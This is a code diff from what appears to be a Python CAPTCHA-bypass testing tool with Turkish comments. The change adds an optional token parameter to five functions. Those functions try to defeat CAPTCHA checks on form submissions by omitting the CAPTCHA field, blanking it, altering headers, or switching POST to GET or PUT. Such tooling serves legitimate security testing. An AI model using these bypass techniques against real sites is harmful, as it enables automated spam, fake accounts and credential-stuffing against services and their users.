@@ -2,16 +2,17 @@ import requests as r
 from utils.parser import parse_req_headers, list_to_dict
 from core.findtoken import find_token_form_urlencoded
 
-def bypass_method_1_urlencoded(url: str, req: str):
+def bypass_method_1_urlencoded(url: str, req: str, token = None):
     # Content-Type'ı urlencoded olan isteklerde captcha parametresini göndermeyerek bypass etmeye çalışır.
     headers = parse_req_headers(req)
-    captcha_token = find_token_form_urlencoded(req)
+    if token == None:
+        token = find_token_form_urlencoded(req)
     form_data = list_to_dict(req)
     response = r.post(url, form_data, headers)
 
     try:
         for key in form_data:
-            if key == captcha_token:
+            if key == token:
                 del form_data[key]
                 break
 
@@ -31,16 +32,17 @@ def bypass_method_1_urlencoded(url: str, req: str):
         print("OOps: Something Else", e)
     except Exception as e:
         print("Error! ", e)
-def bypass_method_2_urlencoded(url: str, req: str):
+def bypass_method_2_urlencoded(url: str, req: str, token = None):
     # Content-Type'ı urlencoded olan isteklerde captcha parametresini boş göndererek bypass etmeye çalışır.
     headers = parse_req_headers(req)
-    captcha_token = find_token_form_urlencoded(req)
+    if token == None:
+        token = find_token_form_urlencoded(req)
     form_data = list_to_dict(req)
     response = r.post(url, form_data, headers)
 
     try:
         for key in form_data:
-            if key == captcha_token:
+            if key == token:
                 form_data[key] = ""
                 break
 
@@ -59,10 +61,11 @@ def bypass_method_2_urlencoded(url: str, req: str):
         print("OOps: Something Else", e)
     except Exception as e:
         print("Error! ", e)
-def bypass_method_3_urlencoded(url: str, req: str):
+def bypass_method_3_urlencoded(url: str, req: str, token = None):
     # Content-Type'ı urlencoded olan isteklerde Headerlar kullanılarak bypass etmeye çalışır.
     headers = parse_req_headers(req)
-    captcha_token = find_token_form_urlencoded(req)
+    if token == None:
+        token = find_token_form_urlencoded(req)
     form_data = list_to_dict(req)
     response = r.post(url, form_data, headers)
 
@@ -91,10 +94,11 @@ def bypass_method_3_urlencoded(url: str, req: str):
         print("OOps: Something Else", e)
     except Exception as e:
         print("Error! ", e)
-def bypass_method_4_urlencoded_get(url: str, req: str):
+def bypass_method_4_urlencoded_get(url: str, req: str, token = None):
     # Content-Type'ı urlencoded olan isteklerde POST -> GET ile bypass etmeye çalışır.
     headers = parse_req_headers(req)
-    captcha_token = find_token_form_urlencoded(req)
+    if token == None:
+        token = find_token_form_urlencoded(req)
     form_data = list_to_dict(req)
     response = r.post(url, form_data, headers)
     del headers["Content-Type"]
@@ -116,10 +120,11 @@ def bypass_method_4_urlencoded_get(url: str, req: str):
         print("OOps: Something Else", e)
     except Exception as e:
         print("Error! ", e)
-def bypass_method_4_urlencoded_put(url: str, req: str):
+def bypass_method_4_urlencoded_put(url: str, req: str, token = None):
     # Content-Type'ı urlencoded olan isteklerde POST -> PUT ile bypass etmeye çalışır.
     headers = parse_req_headers(req)
-    captcha_token = find_token_form_urlencoded(req)
+    if token == None:
+        token = find_token_form_urlencoded(req)
     form_data = list_to_dict(req)
     response = r.post(url, form_data, headers)
 
